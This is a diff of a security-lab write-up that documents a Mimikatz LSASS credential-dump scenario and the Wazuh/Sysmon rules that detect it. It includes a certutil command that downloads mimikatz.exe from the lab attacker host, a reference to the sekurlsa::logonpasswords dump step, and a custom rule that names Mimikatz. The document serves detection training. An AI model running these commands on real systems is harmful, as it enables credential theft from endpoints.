@@ -2,17 +2,18 @@
 
 The post-compromise chain: it continues directly from Scenario 02, taking the
 RDP foothold and showing what an attacker does *next* — pull a tool onto the host
-and steal credentials out of memory. This is the scenario that validates the
-custom Mimikatz rule and exercises the Credential Access tactic end-to-end.
+and steal credentials out of memory. This is the scenario that exercises the
+Credential Access tactic end-to-end and contrasts behavior-based with name-based
+detection.
 
 | | |
 |---|---|
 | **MITRE ATT&CK** | T1003.001 (OS Credential Dumping: LSASS Memory) — chained from T1110 (Scenario 02) via T1105 (Ingress Tool Transfer) |
 | **Attacker** | Kali — 192.168.56.10 |
 | **Target** | Windows 10 — DESKTOP-T0LOHB5 (192.168.56.30) |
-| **Detection source** | Wazuh agent → Sysmon (Event ID 1, process creation) |
-| **Rules fired** | 100002 (custom, level 15 — Mimikatz by original filename) |
-| **Status** | ⏳ Rule built — run to validate & capture evidence (see §7) |
+| **Detection source** | Wazuh agent → Sysmon (Event ID 10, process access to LSASS; Event ID 1 for the custom rule) |
+| **Rules fired** | 92900 (built-in, level 12 — LSASS access, possible credential dump) · 100002 (custom, level 15 — Mimikatz by original filename, logtest-validated) |
+| **Status** | ✅ Validated (rule 92900 fired live — 6 LSASS-access events; see §2 & §7) |
 
 ---
 
@@ -21,6 +22,11 @@ custom Mimikatz rule and exercises the Credential Access tactic end-to-end.
 This scenario assumes the foothold from **Scenario 02**: the `Client` account on
 the Windows host has been compromised via RDP brute force, giving a hands-on
 session on `192.168.56.30`. From there the attacker performs two actions.
+
+> _Note on chronology: the scenarios were exercised independently. This
+> credential-dumping run was performed on the same host under the same `Client`
+> account, logically continuing the Scenario 02 compromise rather than as one
+> unbroken session._
 
 **Step 1 — Pull the tool onto the host (T1105).** Mimikatz is served from Kali
 (the same simple HTTP-server pattern used to detonate the phishing IOC in
@@ -37,8 +43,8 @@ python3 -m http.server 80
 certutil.exe -urlcache -split -f http://192.168.56.10/mimikatz.exe C:\Users\Public\m.exe
 ```
 
-The rename to `m.exe` is intentional — it demonstrates that the detection below
-does **not** rely on the file's name on disk.
+The rename to `m.exe` is intentional — it demonstrates that the detections below
+do **not** rely on the file's name on disk.
 
 **Step 2 — Dump credentials from memory (T1003.001).** Mimikatz is run against
 LSASS to read credential material for accounts logged on to the host:
@@ -57,15 +63,44 @@ elevated/SYSTEM context, which the foothold provides.)
 
 ## 2. Detection
 
-**Sysmon Event ID 1 (process creation)** is the key sensor here. When `m.exe`
-launches, Sysmon records the process — and crucially logs the **OriginalFileName**
-field, which is read from the PE's embedded version metadata, **not** from the
-file's name on disk. Mimikatz's compiled binary carries `mimikatz.exe` in that
-metadata, so renaming the file does not change it. Wazuh decodes this field as
-`win.eventdata.originalFileName`.
+Two detections cover this activity, and the distinction between them is the
+analytic point of the scenario: a **behavioral** rule that caught it live, and a
+**name-based** custom rule built alongside it.
 
-**Custom rule 100002** (`config/local_rules.xml`, level **15** — the maximum
-severity) matches on that field:
+### 2a. Behavioral detection — rule 92900 (validated live)
+
+The detection that actually fired is Wazuh's built-in **rule 92900**, driven by
+**Sysmon Event ID 10 (process access)**. When Mimikatz opens a handle to LSASS to
+read its memory, Sysmon records the cross-process access and 92900 matches it:
+
+```
+rule.id            92900   (level 12)
+rule.description   "Lsass process was accessed by C:\Users\Public\m.exe
+                    with read permissions, possible credential dump"
+rule.groups        sysmon, sysmon_eid10_detections, windows
+rule.mitre.id      T1003.001   (Credential Access / LSASS Memory)
+eventID            10          (Sysmon process access)
+sourceImage        C:\Users\Public\m.exe      ← the renamed Mimikatz binary
+targetImage        C:\Windows\system32\lsass.exe
+grantedAccess      0x1010      (read access to process memory)
+sourceUser         DESKTOP-T0LOHB5\Client
+```
+
+This is **behavior-based**: it keys on *the act of reading LSASS memory*, not on
+any filename, so the rename to `m.exe` is irrelevant — the access itself is the
+signal. It fired **6 times** live during the run.
+
+> _Evidence: `evidence/scenario-05-creddump/wazuh-92900-alert.json`,
+> `wazuh-92900-alerts.png`, `wazuh-92900-detail.png`_
+
+### 2b. Name-based custom rule — rule 100002 (detection-engineering exercise)
+
+Alongside the built-in, a **custom rule 100002** was written to catch Mimikatz by
+the identity baked into its binary, using **Sysmon Event ID 1 (process
+creation)**. Sysmon logs the **OriginalFileName** field — read from the PE's
+embedded version metadata, **not** the file's name on disk. Mimikatz's compiled
+binary carries `mimikatz.exe` there, so a rename doesn't change it. Wazuh decodes
+it as `win.eventdata.originalFileName`:
 
 ```xml
 <rule id="100002" level="15">
@@ -80,51 +115,58 @@ severity) matches on that field:
 ```
 
 Plain-English, line by line:
-- `<field name="win.system.providerName">^Microsoft-Windows-Sysmon$</field>` — only Sysmon events.
-- `<field name="win.system.eventID">^1$</field>` — only Event 1 (process creation).
-- `<field name="win.eventdata.originalFileName" type="pcre2">(?i)mimikatz\.exe</field>` — case-insensitive regex match on the PE's original filename metadata.
-- `level 15` — Wazuh's top severity; this is a "wake someone up" alert, not a maybe.
+- `providerName ^Microsoft-Windows-Sysmon$` — only Sysmon events.
+- `eventID ^1$` — only Event 1 (process creation).
+- `originalFileName (?i)mimikatz\.exe` — case-insensitive regex match on the PE's original filename metadata.
+- `level 15` — Wazuh's top severity.
 
-The rule therefore fires on `m.exe` even though nothing on disk is named
-`mimikatz`.
+**Status of 100002:** confirmed with `wazuh-logtest` (Phase 3 → rule 100002, level
+15, T1003), but **not captured firing live** — this run was validated on the
+behavioral rule 92900. Treat 100002 as a working, logtest-validated custom
+detection whose live capture is an optional follow-up (§7).
 
-**Why field-matching instead of a Sysmon rule group.** The rule originally
-depended on `<if_group>sysmon_event1</if_group>`, but it never fired. The events
-decode correctly (`win.eventdata.originalFileName` is populated), yet on this
-pipeline the Windows events are handled by the `windows_eventchannel` decoder,
-which does not place them in a `sysmon_event1` group — so the group dependency was
-never satisfied. Matching the decoded fields directly (`providerName` + `eventID`
-+ `originalFileName`) removes the dependency on a group that isn't produced, and
-is the pattern Wazuh's own documentation uses for custom Sysmon rules. Confirmed
-with `wazuh-logtest`: Phase 3 → rule 100002, level 15, T1003.
+**Why field-matching instead of a Sysmon rule group.** 100002 originally depended
+on `<if_group>sysmon_event1</if_group>`, but it never matched. The events decode
+correctly (`win.eventdata.originalFileName` is populated), yet on this pipeline the
+Windows events are handled by the `windows_eventchannel` decoder, which does not
+place them in a `sysmon_event1` group — so the group dependency was never
+satisfied. Matching the decoded fields directly (`providerName` + `eventID` +
+`originalFileName`) removes the dependency on a group that isn't produced, and is
+the pattern Wazuh's own documentation uses for custom Sysmon rules. See
+[challenges-and-resolutions.md](../challenges-and-resolutions.md).
 
-**certutil step (telemetry, optional rule).** The `certutil` download also
-generates a Sysmon Event ID 1 record whose command line shows the full
-`http://192.168.56.10/...` URL. That is visible in the telemetry as the Ingress
-Tool Transfer (T1105) half of the chain; a custom rule on `certutil.exe` +
+### 2c. Ingress-tool-transfer telemetry (certutil)
+
+The `certutil` download also generates a Sysmon Event ID 1 record whose command
+line shows the full `http://192.168.56.10/...` URL — the Ingress Tool Transfer
+(T1105) half of the chain, visible in telemetry. A custom rule on `certutil.exe` +
 `urlcache`/`-f` is an easy add if you want it alerted rather than just observed.
 
-> _Evidence: `evidence/scenario-05-creddump/wazuh-100002-alert.json`,
-> `evidence/scenario-05-creddump/sysmon-event1.png`_
+> _Evidence: `evidence/scenario-05-creddump/wazuh-92900-alert.json`,
+> `wazuh-92900-alerts.png`, `wazuh-92900-detail.png`_
 
 ---
 
 ## 3. Triage
 
-- **Severity** — rule 100002 is **level 15**. Mimikatz's PE metadata appearing in
-  a process-creation event has essentially **no benign explanation** on an
-  endpoint; this is not an alert that needs ruling out, it's one that needs
-  responding to.
-- **The rename tell** — the on-disk name was `m.exe`, but the detection fired on
-  the embedded `mimikatz.exe`. That mismatch (benign-looking filename, known-bad
-  binary identity) is itself a strong malicious signal.
+- **Detection & severity** — the behavioral rule **92900 (level 12)** fired **6
+  times**, each recording `m.exe` opening `lsass.exe` with `grantedAccess 0x1010`
+  (read). Reading LSASS memory from a user-writable path (`C:\Users\Public\`) has
+  essentially **no benign explanation** on an endpoint. *Note the two scales:
+  92900 is level 12 on Wazuh's detection scale, but the incident severity is
+  **Critical** — severity is impact-based (a confirmed credential dump on a
+  compromised admin host), not the detecting rule's number.*
+- **The rename tell** — the on-disk name was `m.exe`. The behavioral rule caught
+  it regardless; the custom name-based rule (100002) would catch it on the PE's
+  embedded `mimikatz.exe` identity. Either way, a benign-looking filename hiding a
+  known-bad binary accessing LSASS is itself a strong malicious signal.
 - **Correlation across scenarios** — this fired on the same host
-  (`192.168.56.30`) that was compromised in Scenario 02. Failed RDP logons →
-  lockout → successful logon → **now credential dumping** is a coherent attacker
-  progression, not an isolated event. Tying 100002 back to the Scenario 02 alerts
-  is the analytic core.
+  (`192.168.56.30`) and user (`Client`) compromised in Scenario 02. Failed RDP
+  logons → lockout → successful logon → **now credential dumping** is a coherent
+  attacker progression, not an isolated event. Tying 92900 back to the Scenario 02
+  alerts is the analytic core.
 
-**Verdict:** True positive, **critical**. Confirmed credential-dumping attempt on
+**Verdict:** True positive, **Critical**. Confirmed credential-dumping attempt on
 an already-compromised host.
 
 ---
@@ -170,51 +212,58 @@ noted as a possible extension rather than a gap.
 
 ## 6. Lessons Learned
 
-- **Detecting on OriginalFileName beats detecting on filename.** Matching the PE's
-  embedded metadata (`win.eventdata.originalFileName`) means a simple rename
-  doesn't evade the rule. Its honest limitation: an attacker who recompiles or
-  edits the binary to strip/alter that metadata would slip past it — which is why
-  a complementary, behavior-based detection on **LSASS access itself** (Sysmon
-  Event ID 10, process access targeting `lsass.exe`) is the more robust control.
-  Name-based rules catch the lazy case; behavior-based rules catch the capable one.
+- **Behavior-based detection beats name-based — and here it's the one that fired.**
+  The custom name-based rule (100002, OriginalFileName) defeats a simple rename,
+  but an attacker who recompiles or strips that PE metadata slips past it. The
+  behavioral rule (92900, Sysmon Event ID 10 — process access to `lsass.exe`) keys
+  on the *act* of reading LSASS memory, so it caught this run live regardless of
+  filename. Name-based rules catch the lazy case; behavior-based rules catch the
+  capable one — which is why 92900 is the primary detection and 100002 the
+  complementary one.
 - **Why LSASS?** The Local Security Authority Subsystem Service holds credential
   material for signed-in users in memory — password hashes, Kerberos tickets, and
   in some configurations plaintext. "Dumping LSASS" means reading that process's
   memory to steal those credentials, which is exactly what
-  `sekurlsa::logonpasswords` does. This is the concept that makes rule 100002,
+  `sekurlsa::logonpasswords` does. This is the concept that makes rule 92900,
   "pass-the-hash," and credential theft one connected story.
-- **Severity should match consequence.** Level 15 is justified here because the
-  event is both high-confidence and high-impact — contrast with recon (alert-only)
-  or a single failed logon (noise until correlated).
+- **Severity is impact-based, not the detector's number.** The behavioral rule is
+  level 12 on Wazuh's scale, yet the incident is **Critical**: a confirmed LSASS
+  credential dump means every credential cached on the host must be treated as
+  stolen. Severity tracks consequence (impact + confidence), which is why this
+  ranks above recon (alert-only) or a single failed logon (noise until correlated).
 - **`logtest` success ≠ live detection** (the recurring lab meta-lesson): confirm
   the rule fires on a real Sysmon event with the agent Active, then capture the
-  evidence — don't rely on `wazuh-logtest` alone.
+  evidence — don't rely on `wazuh-logtest` alone. This is exactly the gap between
+  100002 (logtest-passed) and 92900 (caught live).
 
 ---
 
 ## 7. Validation & evidence capture
 
-Rule 100002 was written during the build but **not yet triggered live** — this
-scenario is the step that validates it. Run the attack above against the lab host,
-then capture:
+The scenario was **validated live on rule 92900** — 6 LSASS-access events captured
+during the run. To reproduce and capture:
 
 ```bash
 mkdir -p evidence/scenario-05-creddump
 
-# the Mimikatz-usage alert (level 15) — wait for the Sysmon event to reach the manager
+# the behavioral LSASS-access alert (92900) — the validated detection
+sudo grep '"id":"92900"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
+  > evidence/scenario-05-creddump/wazuh-92900-alert.json
+```
+
+**Screenshots (captured):** the 92900 alert list, and the alert detail showing
+`sourceImage: m.exe → targetImage: lsass.exe`, `grantedAccess: 0x1010`, and MITRE
+T1003.001 → `evidence/scenario-05-creddump/wazuh-92900-alerts.png`,
+`wazuh-92900-detail.png`.
+
+**Optional follow-up — capture 100002 live.** The custom name-based rule is
+logtest-validated but not yet caught firing on a real event. To capture it, run the
+attack with the agent Active and grep for the alert:
+
+```bash
 sudo grep '"id":"100002"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
   > evidence/scenario-05-creddump/wazuh-100002-alert.json
 ```
 
-**Screenshots:** the rule 100002 alert in the dashboard/`alerts.log`, and the
-Sysmon Event ID 1 record showing `OriginalFileName: mimikatz.exe` against the
-on-disk name `m.exe` → `evidence/scenario-05-creddump/`.
-
-> Once captured, update the **Status** in this file's header to ✅ Validated and
-> move T1003 in `docs/mitre-coverage.md` from "rule built, detection ready" to a
-> validated row citing this scenario.
-
-**Expected alert (fill in with the real capture):**
-```
-<<paste the captured rule-100002 alert JSON / excerpt here after running>>
-```
+> The header Status is ✅ Validated on the strength of 92900.
+> `docs/mitre-coverage.md` lists T1003.001 as validated, citing this scenario.
